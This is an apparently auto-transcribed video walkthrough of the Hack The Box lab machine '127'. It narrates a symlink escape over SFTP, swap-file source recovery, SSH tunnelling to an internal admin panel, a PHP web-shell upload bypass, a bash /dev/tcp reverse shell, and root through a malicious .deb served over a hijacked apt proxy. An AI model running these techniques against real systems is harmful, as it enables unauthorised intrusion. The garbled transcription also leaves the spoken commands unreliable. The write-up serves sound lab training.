 what's going on YouTube this is hip sag me doing one two seven from hack the box and the box the name is a reference obviously to 127 or 127 0 0 1 which is the loopback address and that comes in handy because one of the steps on this box is to actually pivot on to a service that's listening on one 27001 when you pop that service you get on the box and then there's a vulnerable apt configuration the package management on the box may in the middle that to get root so with that being said let's just jump in as always we'll begin with ax and map so - SC for default scripts as vo enumerate versions Oh a up at all formats but in the end map dragna got one - at seven and then the IP address which is ten ten ten one thirty three can take some time to run so I've already ran it looking at the results we have just two ports open the first one is SSH on port 22 and it's banner says it's a debian box then we have HTTP on port 80 and is running Apache HTTP D we could look at these versions and kind of figure out exactly what version of debian this is but I'll leave that as an exercise for you let's go just jump ahead and look at what's on the web page navigating to ten ten ten one thirty three we just see a page and the subtitle on that first one was there is no place like one two seven your free homepage toaster so this tells us two things this is kind of a pun on there's no place like home because 127 oh yeah one two seven is the loopback address so we kind of know what the box means may want to start a cherry tree document creating a sub node called like interesting and then just say 127 is a reference to home which is the loopback address clicking around then little carousel we can see they provide static web hosting for interested people sign up to get your unique username and password we'll do that in a little bit let's just keep looking at the website I find if you just go and try to rush through the website you may miss hints or things or what the page is about so it's always important to go through and fully enumerate says coming soon ipv6 so we can put that in interesting potential of ipv6 so always keep that in mind and then this goes back to the beginning so we have secure SFTP upload so there should be SFTP service sign up says you get an account static file hosting it looks like they want to provide PHP hosting but they could not master chroot handling for apache so we may just want to make a reference that chroot is interesting because I could give us a hint later on saying why they did not use PHP this is another reference to ipv6 and then here is a reference saying that they have some type of do s protection so we won't heavily enumerate the website with like go Buster do it full ports get on that map etc just in case they do have something blocking we don't want to get blocked because that just eats up time so let's go check out the other links statistics looks like a static page or something we just see no links we don't know what we could put here we could try I have been equals 1 or something and fuzz parameters see if we could change this but right now we have no idea how we could change this so we'll just move on looking down these bottom links we have privacy going to stats PHP term stats type PHP is attribution dot PHP so clicking this and it looks like this is just giving references to where all the pictures came from on this website and we have the same failed a banned configuration that's on lightweight and CTF so if you want to enumerate that we can of course go to those machines and look at what type of do s protection is in place so let's go back to home and click sign up today and it says your personal account is ready to be used username is this password is this you can use the provided credentials to upload your page via SFTP and then this hostname so it finally leaked the hairs name of this website so we'll just add this into the host file so 10 10 10 133 is 1 2 7 8 DB and it says your personal home page will be available here looking at this link I guess the cache hasn't happened yet but if we copy this we can paste it link location based and Cherrytree we can see the little squiggly and then a username this is a reference to like Apache home directories so we can potentially enumerate other users on this box so we'll just do squiggly does not exist to see what happens the request URL doesn't exist we can try root and it says root was not found the web server which is the same air as the other one so maybe it's not a way to enumerate all users we go to this specific one it said let's put 10 10 10 127 127 133 I think 127 was the box that did last week we just get a blank index page so let's go and try to log in before I do that go back we need to copy the username and password so let's go back to chariotry go up creds and paste so now we can go login to do that Allwood type is SFTP the username at and then the IP address so we'll do one two two one nope IP address and then it'll ask us for the password so except that paste the password and now we are connected via SFTP so we got this public HTML directory going into that leads us to index.html so what I'm gonna do is make or do test PHP and test out that they only allow static web posting so we'll just do PHP and we can do PHP info like that you may want to do like echo or statement that's not on the like PHP disabled functions if safe mode is enabled but I'm not gonna worry about that right now so upload it via put test dot PHP and we can see it's been uploaded so good a Firefox and we can try to execute test dot PHP we have to do that little squiggly to go in my home directory and then we can do desktop PHP and we get forbidden you don't have permission to access this so let's try a few other extensions we can move test dot PHP to test dot PHP seven upload test dot PHP seven it's put not upload and then we'll also do like test dot txt just seeing what extensions it allows us to do so if we do PHP seven we still get forbidden we do txt we can read the file so doesn't look like we really have anything right now since we can't execute code we go back to the interesting tab and kind of read over uh notes we can see that chroot is mentioned and if you do a help here we can see that symlink is a command just reading through this and I originally found this when I was looking for a way to change the permission of a PHP script if it had like a chmod which it does so I was trying to do like whoops chmod like 755 test dot PHP 7 and see if that fixes it hanging LS chmod desktop PHP to see if we could like change the permissions on this to execute it but we can't however there is that symlink command and chroot is a command that just prevents you from going up directories essentially it changes the root directory and they said they can't figure out how to do it on Apache so we can try this symlink command so we'll symlink slash which is the root directory - we'll just call this please subscribe and it helps if we can spell correctly can't symlink slash to this we get rid of the slash there we go so we can't end in a slash so now when we go here we can do slash please subscribe and we get into the root of the filesystem and we can view a few files looks like we don't have mission to see the directory listing of Etsy but if we entered files within this we can get files and it's odd to see only two accounts and Etsy passwd but it is what it is we can also see the shell is set to bin false so that is what will prevent us from doing like SSH and then the username and password so if we do this 10 3 we can'tjust ssh n so let's go back to where was i oh firefox that's right and just will get what other files we have so there is home we don't have permission to go into this we could go back to the website and do we have a way to see other users on this box because it says there's two users oh wait we do its Etsy passwd so we are probably the second user I would guess y'see okay so we could try going to slash home and then the other guy to see if we can get in that directory and we get directories and I haven't found so I can't do anything there just going through this the user directory nothing there var dub dub dub then we got - we got HTML - admin and HTML so if we go to HTML - admin we have the carousel dot CSS and a swap file so we can try to download this and then we can also go to like HTML and it directs us back to index.php and that is because if you when we first went to 10-10-10 133 I can let me turn intercept on so we can see exactly what happens go to burp proxy it's on go here we get this page as moved and then it directs us to the new page so when we hit that index dot HTML it redirects us here so this is going to be a second way to do it we will get to this wap file in just a second but i want to show the second way to do this oh let's just turn intercept off and then go back a few times this one okay so we could get files out of this directory if we go back to our terminal and we could also do symlink / VAR dub dub dub HTML index.php and then link it to like index dot txt so now when we go to a home directory slash index dot txt we see the contents of index.php so that is two ways to do it so let's save this file real quick make the source leak go in here v and x dot PHP paste this file and then let's just move that file we had downloaded this login PHP dot swap file here and then if we look at it with like less you see it looks weird the magic bytes say them so we know this is a BIM file if we did file against that as well it would say it's a VIN swap file and whenever you open something within vim it creates that swap file in case it closes unexpectedly so you can restore the file so if we did a new window and do them index dot PHP and now do LS - la today show everything including in files we see it created a dot index dot PHP dot swamp if we file that we can see it is a VM swap file we exit this gracefully LS la that file is gone so the file has to begin with a period since the hidden file and and and dot swap so let's move login dot PHP dot swap to dot login dot PHP dot swap and now when we fin login dot PHP it's going to ask us if we want to recover I'm just going to quit this to get my terminal correct so we'll hit Earth to recover and then it says it has recovered and it's saving it to login dot PHP and here we go so in login dot PHP at the very beginning we see a PHP statement if server port is not equal to 680 died so that is a port we have not seen if we end map 10 10 10 133 680 we have to do - p680 we get it is filtered so there's something preventing us from accessing that poor going down let's look at other PHP so there is a slash login dot PHP and then we have if is set login username password leaking a username right here so let's copy this go back here and go to creds well let copied way too much let's go back here and go to the beginning press Vita in a visual mode go to the right double quote + y-two yank and that should open our clipboard there we go and then we'll do the same thing for this hash we should be able to double click this maybe not maybe we click and highlight there we go and then double quote plus yank to put it on a system clipboard remember it ends an 8 I'm not sure if I highlight until D or 8 and it looks like I highlighted until D so let's copy this because that looks like a hash so let's go here echo - n and do WCC to count the characters 64 characters so what hash type is 64 characters it's probably hash identifier so we'll Ishod 2 six have 64 characters so it's a sha-256 sum and if it's just a straight shot some we can probably just go to hashes or again find it that way hash cat can decrypt it but it's always faster if there is a precomputed hash so just click on hash and then I think search there we go paste it in v8 d x b mb and we can see that password has been cracked - home sweet home 1 so get rid of the hash and we just put that there so the next thing to do is figure out where this hash is used and if you remember we had downloaded two files we had downloaded index dot PHP and login dot PHP if you go to the home page again this admin thing was blacked out so we can't click on it so let's go look at index dot PHP and see why that is so if we just do a search on admin we can see if server remote address is equal to 127 0 0 1 or 104 - 4 0 54 have no idea what this address is then enable this link else disable it and it's going to 1 2 7 HD be : 680 and we had already and map that and we get port is filtered we can try - st for a tcp scan but it is still filtered we could do - pn - disabled host discovery but nothing the one thing we know about this box is that it has an SSH service running an SSH does support tunneling so if they don't have gateway ports disabled we may be it or do a port forward through this so if we do SSH and then the username so let's go back here grab this at 10 10 10 133 and before the username we want to do - L for a local port forward and say poor sick 180 on our local box now goes to throat well it goes through this tunnel into one 2700 one port 680 and I'll put a link in the description below if I remember to a video wide explain port forwarding and depth with PowerPoint but for now just know this will open a port on my local box and then go through the SSH connection and send it to this socket so doing this and then the password says this service allows SFTP connectors only because we attempted to start a SSH connection in a full show after this if we just do the - end flag and SSH which is don't execute commands this is useful for just fourteen ports we don't get that error message so paste the password we don't get any prompt back but if we look at our open ports a LMP grep 680 we can see our localhost is listening on port 680 so if we go here and do localhost 680 we get the new page 1 to 7 administration administrative back-end for administrative use only and a username and password and login dot PHP we have found this password so let's just try logging in with the credentials we had OTS - admin and home sweet home 1 click login and we get to a bunch of things we have plug-in upload admin only and this submit query button is disabled can't click it and it says disabled for security reasons so let's just go through each of these things if we click on default user it gives us default user credentials this is a user we don't have so we could try accessing that guy's directory we go here it's the same thing we can also open up a SFTP connection there and see if he has anything which is password shoot it's a different tab copy this 10-10-10 133 pays to do it LS and we get user text so LS public HTML and it still just got that one file we could do - a to view hidden files and it doesn't look like there's anything hidden we can verify we can get user text and then do WC - C on it we can also see the size here which is 32 characters and a line break so that is the user portion of this box we can keep going on we should probably record these credentials and this will be HTTP admin so there is this do feature if we click it and open the file with a text editor we can see it lets us download the script so that may be useful file backup here needs backups recovery is the only thing we need if we click DL on this to see what this script is it is literally a PHP script that says that so let's keep going down the list and just based upon this looking at this URL I can tell that it's just doing a include statement here so the code looks like that so it executes anything you put into this parameter so if there was like a directory traversal so we could do like dot dot slash dot dot slash dot dot slash and then ver HTML dub-dub-dub or not there'd be home and then a username and then we can try yeah public HTML and then index dot HTML we could try that to see if this works but it doesn't mean just get unknown plug-in tight so I was trying to get this add-on parameter to include a unintended file and that did not work so going down we do have this add-on manager and this one's not showing us the source code it is showing us however the looks like Apache rewrite engine rule so this is saying in the URL look for add-on - upload PHP or add-on - download PHP and rewrite that name to this and then this bracket L bracket means last which means stop processing the rules after this so let's look at the source code to add-on manager and I'm just going to download this because it'll make it a little bit easier and let's go to a new shell and we can move downloads what was the name probably OTS add-on there we go into source leak and then just look at this so we can see if the script detects a slash add-on - upload dot PHP go to some functionality to upload code if it has add-on - download PHP go to a place to download the PHP file so that is how this DL button is working so we can see add-on - download PHP and then add-on equals OTS - FS dot PHP I think that's how it's working yeah / add-on not download and it's doing that by the whole URL name so we may be able to trick this script into doing this add-on - upload dot PHP and as Trickett because we have this Apache rewrite engine so if we created a URL to go to slash add-on - download dot PHP slash what we can just do and add-on flash upload if we hit this we'll get into this functionality if we didn't do this add-on - download PHP and just call that script then we'll have this rewrite engine overwrite this add-on - upload with the add-ons OTS whatever but if we leave this to add-on - download PHP the HTTP rewrite engine will see add-on - download PHP overwrite that with this add-on slash OTS - man add-on that PHP and then leave this one alone because you have this bracket L bracket which means stop processing rules so we'll hit the source code of this and then it will look in the URL because here is the variable is compared against request URI and it will see this slash add-on - upload dot PHP and let us in the code so let's test this whole theory hell so if we copy this piece of the URL oh we don't copy this we just want to do and on - download PHP like this copy let's turn our burp intercept it back on we can just refresh the page to get a get request control shifter one default so turn burp suite on come on there we go send this over to the repeater tab and now we're going to want to look at what mode we want to do this in is it a post request or is a get request so if is set files add on file size I'm guessing this once to be a post request because we have to do a file upload so because we have to do a file upload we're gonna change this request up a little bit so we'll just turn intercept off real quick turn it back on and we just want to get a upload HTTP request because we don't have to want to Manley create this so let's go to this browse and just upload a random file so we'll go to route htb boxes one to seven I'm gonna do test txt so we can open this and now we need to click this submit query button so I'm gonna hit all go to tools web developer toggle tools click on inspector and pick an element of the webpage I'm gonna pick this button and say hey button you were no longer disabled and just edit that HTML and suddenly we can click it so we can close this we have intercept on intercept on here clear out a 14 cache submit query and now we saw me have this repeater request if we clicked forward we just get that file does not exist because it is rewriting this URI if we clicked send and this ya 404 not found so that is rewriting this URL again to that so what we have to do is go back to get rid of that I got rid of it okay so go back to the page we want to make a request to add on download PHP and we just got to put something in the URL so we can do this and instead of doing PHP info let's do request please subscribe and we have to encapsulate that and system brackets if we want to execute it with system okay and the file name where is file name right here instead of test.txt let's do patreon dot PHP so click send we get file has been uploaded successfully so let's see if we can find this patreon dot PHP file so turn intercept off it witches is and then just try slash patreon dot PHP has not been found so the directory could be add-ons slash patreon PHP so let's do add-ons patreon dot PHP and we don't get a 404 error it's just a white screen so if we do question mark please subscribe equals Who am I we get WWE admin - data so now we have verified we have code execution let's turn intercept on refresh the page send it over to the repeater tab and then we can say rename this one to be file upload then rename this one to be get shell this we can just close that so we'll just change the request method to a post request because it's easier to work with data down here and do bash - C then bash - I its bracket and dev TCP ten ten fourteen three which I believe is my IP if config tun 0 it is my IP / will do port 9000 1 0 bracket and 1 and that thing highlight everything and then just press control you to URL encode this go back to a terminal will do but modify can t MUX and comma will call this shell - user and NC ll v NP 9001 so click send we don't get a response back immediately which is a good sign and here we go so the first thing I always do Python C input PT y PT y dot spawn slash bin - to fix that and then we do control Z s TTY brawl - echo and then FG Anna so now we have a real shell we can also do like export term is equal to X term so we can clear the screen if we want to which is handy so let's see what we can do as this user the first thing I check go me before running like lettin oom is just checking sudo - L to see what we can do in sudo and we see that WWE admin - data may run the following commands on 1 to 7 we have apt-get update and apt-get upgrade so whenever I see sudo can do something I go straight to Firefox let's make sure intercept is off and do GTFO bins oh I don't have my burp certificate so let's just turn proxy off for now and then go to GTFO bins to get the Frick out bins and we do have a few things so I have to get can get a shell in Souter so if we look at this we have let's see apt-get change log apt and then you just do exclamation point been SH going back to this though we have to do apt-get update or apt-get upgrade so that won't help us out here because if we do add to get upgrade or apt-get change log then we're going to get prompted for a password we only don't get prompted for a password with those two commands I said earlier so now won't help us sudo also doesn't really help us and there's sudo apt-get update - shell and you got a pre invoke command but again if we tried this it asks us for the password going back to that sudo output though we see an interesting setting environment underscore keep FTP proxy HTTP proxy HTTP proxy or no proxy so it's going to keep our HTTP proxy when we do aft commands or any sudo so if we do sudo apt-get update we see this and of course we can't resolve to any place one interesting though we have packages dot one 27.8 gb so if we went into let's see apt and looked at sources list d there is Devon which looks like this is the main repo and there's also one to seven list which has that packages dot one to 7 h gb / Devon so just something to keep in the mind but let's try this whole proxy theory out so the very first thing we do is go back into birth and we're going to proxy options I'm going to create a new listener we're going to bind on port 8081 on the specific interface which is a ton adapter you could also do all interfaces and redirect everything to one 27001 to port 80 or we can do 8,000 since that's the default of simple HTTP server click ok and then we're also going to grab what is the thing CD sources dot list D cap 1 to 7 packages dot 1 to 7 h TB and we're going to add that in our hosts file so our box knows to go to one 27001 whenever it sees packages dot 1 to 7 h DV and then we also have to start our Python server so python gem simple HTTP server so now if we set the proxy up here we're gonna have apt go through the proxy hit herbart proxy which is then going to redirect it to one 27001 which is going to be simple HTTP server so let's do sudo - l HTTP underscore proxy is equal to HTTP 10 10 14 3 colon 8080 one man that sucks do a and V so we can make sure the proxy set grep HTTP did not we have to do export space did I do that I did not so you want to do I'll just type and burp to go to export HTTP proxy is equal to 10 10 14 388 1 I think that's exactly what I typed but you can confirm it when you type N and see that environment variable now if we do have to get update sudo apt-get update we can see the server is requesting a bunch of files from us so now all we have to do is trick it into downloading files from us and we see these warnings and error messages and this one is interesting it's never reached out to packages dot 1 to 72 B because it doesn't have a release file so the repository can't be authenticated this Deb Devon just says it can't be done securely so it's disabled because it's talked to a release file so in release release file is kind of just like a ssh private key think of it that way and it's just a way to identify if you're being man-in-the-middle because there is no release file for this packages dot 1 - 7 th DB and this machine has never seen a release file for that there's no way for it to validate who this guy is and if there's no way to validate who he is then anyone can become him so that's what we are going to do so we'll go back to our box go into this dub-dub-dub directory and it's making a request to slash Devon so let's make directory de v uan and now we have to figure out exactly what he's wearing we can go through these four packages dot GZ and just look through and we can see it wants to go into Devon discs ASCII main binary so going to make this directory so make turn - P just asking main whatever and we're going to leave that there for now because the packages follow that we create is going to have to have md5 sums and stuff actually let's just do that now so let's go into that directory and let's see let's go back to the error messages will go to burp and go to a proxy HTTP history and see he's ever trying to go to there we go de deb we just want to get a example packages file so here okay Devon dis then was like ASCII what do we create ASCII main binary AMD at 64 so ASCII main so packages is not binary AMD 64 we can just do packages GZ save the file move downloads packages here gun zip to uncompress it go to edit it and we just want to take one package so I'm hitting one and a bunch of zeros then DD to delete all lines and we have example packages so let's go back to a shell and just do a deep package - L to look at things we could replace this is gonna show us what is installed so I'm going to let's pick telnet because I don't think many things will depend on telnet so probably don't to worry about it so we'll do telnet let me just copy this go here paste so the package name it's going to be telnet we probably don't need the source the version has to be higher than this so we'll do 0.17 I would do 1 8 - leet the installed size I don't think we need maintainer we can put whatever you want here so we'll just do please subscribe architecture our package is AMD 64 so we'll leave that let's get rid of dependencies description will do pwned delete this homepage probably don't need section I don't think we need this I'm just gonna put all priority or change this to required again probably don't have to file name we'll just put it in the root and we'll call it telnet DB and then these last four I don't think you need md5 or sha-1 56 these last two things we'll do after we create the binary so save that and then let's go to Firefox and actually to make this easy PWD copy all this be packages Oh name there we go so now it's going to look in the same directory as a packages file for a telnet binary so we want to go jumping back and forth through directories but now we have to make a malicious tonette by name alright tonette package so we can make two-tone it and then go to google and say make malicious deb file and see how do we do that there is a tool called derby i don't want to use this Python tool because it'll take the fun out of learning how it works so let's just go examine it so we can see this is just calling chord generator import generator so let's look at this function core generator by let's see it's taking it's going in packages Debian and let's see and then dude does go package this is how to read then I thought it would be control okay so you got package slash Debian you need a control file and a post install file so let's go in here make the Debian go into Debian V control and then we go back go to Derby go to templates and look at the template they use for control so paste architecture we want amd64 version we'll need to change that and the maintainable change so package is telnet and then let's just go to dub dub dub all this one more directory cat packages the maintainer please subscribe and the version is going to be 0.18 - Lee okay description we can also put code so now we got that so now we got to create the post install file so V post i n st we go back to templates post i n st and it's doing something different but this is just a bash script so we can do that and then the same exact command so bash - see bash - I that dev TCP ten ten fourteen three port 9000 1 and then 0 1 like that I think we go back to burp go to a repeater tab get shell control shift you two on your own code we can see exactly the command we ran which that is the same thing and we can reuse 9001 because once or tonot connects it's no longer listening on the pork so if we do net stat - al NP grab 9001 we can see that socket is established but we don't have one that is listening so we could do NC l v NP 9001 do that again and you can see there is one listening so pretty cool so there's that we want to chmod 755 on the first install and now we just have to make the package so going over to Firefox and looking at the generator it just does a deep access tab and - - build so deep package - Deb - - Build telnet and we have now created the telnet Deb package so let's do D you - be 4 bytes or we can just read here and get 728 I've specified Deb and get 7 28 bytes we also want to do a sha-256 some on that and get this long string so let's go into packages did I say 728 hopefully and sha-256 there we go I did so let's compress the packages with gzip and there we go so now when we do apt update it should pull that packages GZ file which will tell it to update tonette so let's test this out let's do sudo apt-get update and let's see reading it did not and is bizarre so let's see do we get packages GZ it did one on 200 so maybe it just won't tell us maybe it's just hiding within all these errors let's do apt-get upgrade because I verified that would it go the server did a get request on this and port it since that's a 200 everything else is 404 so sudo apt-get upgrade and it says the following package will be upgraded telnet so let's do yes to continue the following package cannot be authenticated do you want to upgrade and this is because of that whole release file thing the server doesn't have it so we can't authenticate but let's do yes anyways and shoot I was not listening on the port NC l vnp 9001 we'll do it down there actually hopefully it'll still work well we have to pick a different package I'm not fully installed or removed sure okay so we it still worked so do it LS or Who am I I can type Who am I we are route go into / route WC - sea route txt and we can read that file so that is the box hope you guys enjoyed take care and I will see you all next week